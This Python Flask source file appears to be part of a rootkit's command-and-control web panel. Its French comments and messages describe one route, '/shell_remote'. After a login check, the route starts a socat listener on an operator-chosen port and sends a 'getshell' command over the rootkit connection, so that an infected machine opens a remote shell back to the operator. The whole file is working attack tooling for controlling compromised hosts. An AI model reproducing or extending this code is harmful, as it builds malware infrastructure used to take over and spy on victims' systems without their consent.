from app import app
import config as cfg
from flask import render_template, redirect, url_for, request
from utils.socat import run_socat_shell
import threading, time

# ------------------------------- REMOTE SHELL ------------------------------- #

@app.route('/shell_remote', methods=['GET', 'POST'])
def shell_remote():
    if not cfg.authenticated:
        return redirect(url_for('login'))

    shell_output = ""
    if request.method == 'POST':
        port = request.form.get('port')

        try:
            # Vérifier si le port est valide
            port = int(port)
            if port < 1024 or port > 65535:
                shell_output = "❌ Le port doit être entre 1024 et 65535."
            else:
                threading.Thread(target=run_socat_shell, args=(port,)).start()
                time.sleep(1)
                # Envoyer la commande au rootkit pour démarrer le shell distant sur le port choisi
                with cfg.connection_lock:
                    if cfg.rootkit_connection:
                        cfg.rootkit_connection.sendall(f"getshell {port}\n".encode())
                        shell_output = f"🚀 Shell distant lancé sur le port {port}."
                    else:
                        shell_output = "❌ Rootkit non connecté."

        except ValueError:
            shell_output = "❌ Le port doit être un nombre valide."

    return render_template("shell_remote.html", shell_output=shell_output)
